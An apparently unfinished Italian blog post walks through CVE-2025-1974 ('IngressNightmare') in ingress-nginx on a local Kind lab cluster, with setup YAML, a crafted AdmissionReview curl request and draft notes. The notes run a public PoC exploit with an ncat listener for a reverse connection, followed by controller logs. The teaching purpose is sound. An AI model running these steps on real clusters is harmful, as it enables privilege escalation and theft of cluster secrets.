---
title: "How IngressNightmare vulerability works and how to exploit it"
authors:
- admin
date: "2025-03-30T00:00:00Z"
doi: ""

# Schedule page publish date (NOT publication's date).
# publishDate: "20-01-01T00:00:00Z"

# Publication type.
# Accepts a single type but formatted as a YAML list (for Hugo requirements).
# Enter a publication type from the CSL standard.
# # publication_types:["stocazzo"]

# Publication name and optional abbreviated publication name.
publication: ""
publication_short: ""

# abstract: "Boost Your Kubernetes Workflow: Aesthetic & Productivity Hacks"

# Summary. An optional shortened abstract.
summary: A deep dive into IngressNightmare vulnerability
tags:
- Kubernetes



featured: true

links:
url_pdf: ''
url_code: ''
url_dataset: ''
url_poster: ''
url_project: ''
url_slides: ''
url_source: ''
url_video: ''

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
image:
  caption: ''
  focal_point: ""
  preview_only: false

# Associated Projects (optional).
#   Associate this publication with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `internal-project` references `content/project/internal-project/index.md`.
#   Otherwise, set `projects: []`.
projects:
- internal-project

# Slides (optional).
#   Associate this publication with Markdown slides.
#   Simply enter your slide deck's filename without extension.
#   E.g. `slides: "example"` references `content/slides/example/index.md`.
#   Otherwise, set `slides: ""`.
slides: example
---

## TLDR

Il 24 marzo 2025, mentre giocavo a TeamfightTactics, vengo inondato da notifiche sulla scoperta di alcune vulnerabilità all'interno dell'ingress di nginx. Tra queste, la più critica è CVE-2025-1974, a cui viene assegnato uno score di 9.8

Dopo qualche minuto sono cominciate le domande delle prime persone spaventate

- Siamo vulnerabili? Ora ci tocca disinstallare il nostro ingress nginx? E come esporremo gli applicativi? Daremo disservizio! 
- Come facciamo a capire se qualcuno ha sfruttato questa vulnerabilità?
- Abbaimo modo di mitigare i danni?

Risposta breve:

Queata vulnerabilità, se l'AdmissionWebhook di Nginx non è stato esposto all'esterno del cluster Kubernetes (cosa che di default non avviene perché il suo service è di tipo ClusterIP) è sfruttabile solo dall'interno del cluster.

È sfruttabile solo dall'interno perché essendo il service di tipo ClusterIP, gli unici a poter raggiungere il pod che è dietro quel service sono gli altri pod all'interno del cluster.

Quindi per poter exploitare questa vulnerabilità, dobbiamo essere già utenti con un qualche tipo di accesso al cluster. 
L'accesso di cui abbiamo bisogno deve essere un accesso che ci consenta di creare risorse di tipo Ingress.
È proprio durante la creazione di questo tipo di risorse che siamo impattati da questa vulnerabilità

In molti degli scenari del mondo reale chi può creare risorse di tipo Ingress può già fare ogni operazione all'interno del cluster Kubernetes. 

C'è un solo tipo di scenario in cui questa vulnerabilità è gravissima: quello dei cluster multitenant.
Ovvero quei cluster condivisi da più gruppi di lavoro o addirittura da utenti/compagnie diverse in cui gli operatori hanno dei ruoli RBAC che gli consentono la sola creazione di alcune o tutte le risorse ristrette ad un solo namespace.
Sfruttando questa vulnerabitlià possiamo usare un ruolo che ha dei privilegi minimi (sola creazione di ingress) per poter leggere tutte le risorse di tipo Secret presenti all'interno del cluster Kubernets


Pr la risposta lunga e più dettagliata, puoi continuare a leggere questo articolo

## Cos'è ingress Nightmare e come funziona

## Qualche definizione

## Setup dell'ambiente vulnerabile

Per la nostra demo utilizzeremo un cluster Kind e andremo ad installare la versione vulnerabile dell'ingress nginx

Per dimostrare invece la privilege escalation andremo a creare un pod da cui ci sarà possibile utilizzare kubectl e garantiremo a quel pod i permessi per vedere tutte le risorse all'interno di un singolo namespace che chiameremo "sandbox"

L'obiettivo della demo sarà fare privilege escalation e riuscire a leggere tutti i secret all'interno del nostro cluster Kubernetes

### Demo cluster

Utilizzeremo questo file di configurazione per il setup del cluster con Kind

```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
- role: worker
- role: worker
```

A questo punto possiamo effettuare il bootstrap del nostro cluster Kubernetes

```
kind create cluster --config kind.yml
```

### Setup dell'ingress affetto dalla vulnerabilità

La versione di nginx-ingress vulnerabile è la 1.12.0. Utilizziamo helm

```shell
helm install ingress-nginx ingress-nginx --repo https://kubernetes.github.io/ingress-nginx --namespace ingress-nginx --create-namespace --version 4.12.0
```

### Setup del kubectl-pod

A questo punto, per simulare un utente che abbia permessi per creare risorse all'interno di un singolo Kubernetes namespace, utilizziamo un pod a cui associamo un service account con un ruolo RBAC ristretto.
In questo pod ci saranno due container:
- Il primo interagire con il cluster utilizzando kubectl
- Il secondo per fare delle richieste tramite curl 

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: sandbox
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: sandbox-sa
  namespace: sandbox
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: sandbox-role
  namespace: sandbox
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: sandbox-rolebinding
  namespace: sandbox
subjects:
  - kind: ServiceAccount
    name: sandbox-sa
    namespace: sandbox
roleRef:
  kind: Role
  name: sandbox-role
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: kubectl-pod
  namespace: sandbox
spec:
  serviceAccountName: sandbox-sa
  containers:
    - name: kubectl
      image: bitnami/kubectl:latest
      command: ["sleep", "infinity"]
    - name: curl
      image: curlimages/curl:latest
      command: ["sleep", "infinity"]

```

A quesoto punto possiamo verificare che il pod abbia i permessi corretti provando ad interagire con il cluster Kubernetes dopo aver acquisito una shell in quel container

```shell
kubectl exec -it kubectl-pod -n sandbox -c kubectl -- kubectl get pods
```

Cosa succede se proviamo a leggere i secret all'interno di questo namespace utilizzando il service account del nostro pod?

```shell
kubectl exec -it kubectl-pod -n sandbox -c kubectl -- kubectl get secret
```

E cosa succede se proviamo a leggere tutti i segreti presenti all'interno del clsuter?

```
kubectl exec -it kubectl-pod -n sandbox -c kubectl -- kubectl get pods -A
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:sandbox:sandbox-sa" cannot list resource "secrets" in API group "" at the cluster scope
command terminated with exit code 1
```

Non possiamo!

L'ultimo requisito da verificare è se possiamo creare oggetti di tipo ingress utilizzando questo pod

```shell
kubectl exec -it kubectl-pod -n sandbox -c kubectl -- /bin/bash
```

```shell
echo "apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: kubectl-ingress
  namespace: sandbox
  annotations:
    kubernetes.io/ingress.class: "nginx"
spec:
  rules:
    - host: kubectl.sandbox.local
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: kubectl-service
                port:
                  number: 80" > /tmp/ingress.yml
```

A questo punto possiamo applicare la nostra risorsa

```shell
kubectl apply -f /tmp/ingress.yml
```

E verifiacre dalla shell principale che l'ingress sia stato creato

```shell
kubectl get ingress -A           
NAMESPACE   NAME              CLASS    HOSTS                   ADDRESS   PORTS   AGE
default     my-ingress        nginx    myapp.example.com                 80      24h
sandbox     kubectl-ingress   <none>   kubectl.sandbox.local             80      43s
```

Il nostro ambiente di demo è pronto!

1. Abbiamo una cli con accesso ristretto alle risorse del cluster ✅
2. Riusciamo ad ottenere le risorse del namespace in cui ci troviamo ✅
3. Riusciamo a creare una risosrsa di tipo ingress con un utente che non ha permessi di admin ✅
4. NON riusciamo a ottenere tutti i segreti all'interno del cluster utilizzando l'utente non autorizzato ✅

Ora è il momento di fare privilege escalation!

## Exploit

A partire dal container in cui è presente l'eseguibile di curl, effettuiamo una richiesta al nostro AdmissionWebhook

Con questa post stiamo sottoponendo una risorsa di tipo ingress all'AdmissionWebhook dell'nginx ingress controller. Se la richiesta è valida, ci aspettiamo una risposta positiva dall'AdmissionWebhook
```shell
curl -vk https://ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local:/validate -H "Content-Type: application/json" -d'{
  "apiVersion": "admission.k8s.io/v1",
  "kind": "AdmissionReview",
  "request": {
    "kind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "resource": {
      "group": "",
      "version": "v1",
      "resource": "namespaces"
    },
    "operation": "CREATE",
    "object": {
      "metadata": {
        "name": "sample-ingress"
      },
      "spec": {
        "ingressClassName": "nginx",
        "rules": [
          {
            "host": "example.com",
            "http": {
              "paths": [
                {
                  "path": "/",
                  "pathType": "Prefix",
                  "backend": {
                    "service": {
                      "name": "kubernetes",
                      "port": {
                        "number": 80
                      }
                    }
                  }
                }
              ]
            }
          }
        ]
      }
    }
  }
}'
```

Nel momento in cui effettuiamo questa POST, l'AdmissionWebhook la valuterà e se andiamo a vedere i log dei pod dell'nginx-ingress-controller troveremo qualcosa di simile a questo

```
kubectl logs -l app.kubernetes.io/name=ingress-nginx -n ingress-nginx -f
W0330 13:08:15.742096       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 13:08:20.566799       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 13:08:23.901953       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 13:08:31.940030       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 13:08:35.274076       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
I0330 13:09:13.516738       9 leaderelection.go:271] successfully acquired lease ingress-nginx/ingress-nginx-leader
I0330 13:09:13.516781       9 status.go:85] "New leader elected" identity="ingress-nginx-controller-7657f6db5f-xwn4l"
W0330 13:10:12.442579       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 13:10:12.442659       9 controller.go:1109] Error obtaining Endpoints for Service "/kubernetes": no object matching key "/kubernetes" in local store
I0330 13:10:12.464129       9 main.go:107] "successfully validated configuration, accepting" ingress="/"
```




## Conclusioni



## Note

kubectl exec -it ubuntu-pod -n sandbox  -- /bin/bash
apt update && apt install -y python3 git python3-pip python3.12-venv ncat libssl-dev gcc vim net-tools
git clone https://github.com/hakaioffsec/IngressNightmare-PoC.git
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt


Uso l'ip del nodo come ingress url
ncat -lnvp 443 da una shell
python3 exploit.py http://172.20.0.4:31695 https://ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local 10.244.3.4:443 da un'altra shell

I log del nginx controller dicono: ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass

La connessione con netcat funziona da nginx -> pod ubuntu



Durante la fase di exploit ero inondato da richieste del tipo

W0330 16:31:10.574278       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.574425       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.574623       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.574634       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.616194       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.616216       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.616428       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.616435       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.616455       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.616462       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.655297       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.655320       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.657943       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.658502       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.660590       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.660609       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.696768       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.696787       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.700448       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.700475       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.700448       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.700573       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.733672       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.733692       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.738188       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.738210       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.739982       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.739997       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.773453       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.773473       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.778224       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.778242       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.778304       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.778311       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.808156       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.808215       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.816067       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.816120       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.818386       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.818424       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.841703       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.841723       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.855766       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.855785       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.858013       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.858030       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.875137       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.875157       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.891517       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.891537       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.896873       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.896891       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.912737       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.912755       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.933607       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.933630       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.937429       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.937447       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.952570       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.952592       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.972441       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.972460       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.976247       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.976267       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:10.986539       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:10.986562       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:11.010377       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:11.010396       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:11.013975       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:11.013994       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:11.023241       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:11.023262       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:11.048282       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:11.048306       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:11.053106       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:11.053128       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:11.062552       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:11.062570       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:11.080075       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:11.080093       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
W0330 16:31:11.082838       9 controller.go:336] ignoring ingress eumesmo in default based on annotation : ingress does not contain a valid IngressClass
I0330 16:31:11.082859       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"

Quindi ho capito che l'ingerssClass non andava bene e ho impostato la mia ingressClass come ingressClass di default


Aggiungendo questa annotations


ingressclass.kubernetes.io/is-default-class: "true"


Ho correttamente configurato l'ingressClass come default e creando un ingress di prova la configurazione viene presa dall'ingress senza che io abbia specificato l'ingressClassName


Modifica l0ingressClass nel file review.json ottengo gli errori

W0330 16:50:27.041257       9 controller.go:1109] Error obtaining Endpoints for Service "default/nginx": no object matching key "default/nginx" in local store
I0330 16:50:27.049202       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
E0330 16:50:27.053129       9 annotations.go:216] "error reading Ingress annotation" err="location denied, reason: cross namespace secrets are not supported" name="CertificateAuth" ingress="default/eumesmo"
W0330 16:50:27.053251       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 16:50:27.053265       9 controller.go:1109] Error obtaining Endpoints for Service "default/nginx": no object matching key "default/nginx" in local store
I0330 16:50:27.054234       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
I0330 16:50:27.065978       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
E0330 16:50:27.080788       9 annotations.go:216] "error reading Ingress annotation" err="location denied, reason: cross namespace secrets are not supported" name="CertificateAuth" ingress="default/eumesmo"
W0330 16:50:27.080867       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 16:50:27.080879       9 controller.go:1109] Error obtaining Endpoints for Service "default/nginx": no object matching key "default/nginx" in local store
E0330 16:50:27.086777       9 annotations.go:216] "error reading Ingress annotation" err="location denied, reason: cross namespace secrets are not supported" name="CertificateAuth" ingress="default/eumesmo"
W0330 16:50:27.086911       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 16:50:27.086924       9 controller.go:1109] Error obtaining Endpoints for Service "default/nginx": no object matching key "default/nginx" in local store
I0330 16:50:27.092014       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
E0330 16:50:27.095289       9 annotations.go:216] "error reading Ingress annotation" err="location denied, reason: cross namespace secrets are not supported" name="CertificateAuth" ingress="default/eumesmo"
W0330 16:50:27.095372       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 16:50:27.095394       9 controller.go:1109] Error obtaining Endpoints for Service "default/nginx": no object matching key "default/nginx" in local store
I0330 16:50:27.098512       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
I0330 16:50:27.106989       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"
E0330 16:50:27.113594       9 annotations.go:216] "error reading Ingress annotation" err="location denied, reason: cross namespace secrets are not supported" name="CertificateAuth" ingress="default/eumesmo"
W0330 16:50:27.113673       9 controller.go:1109] Error obtaining Endpoints for Service "default/my-service": no object matching key "default/my-service" in local store
W0330 16:50:27.113686       9 controller.go:1109] Error obtaining Endpoints for Service "default/nginx": no object matching key "default/nginx" in local store
I0330 16:50:27.124261       9 main.go:107] "successfully validated configuration, accepting" ingress="default/eumesmo"


Ho modificato anche il nome del servizio nel file di configurazione review.json con ingress-nginx-controller


Ho cambaito anche il namespace in cui la risorsa ingress viene creata


L'ultimo errore che ho riscontrato nel riprodurre l'exploit è 

E0330 18:56:32.428621      10 annotations.go:216] "error reading Ingress annotation" err="location denied, reason: cross namespace secrets are not supported" name="CertificateAuth" ingress="default/eumesmo"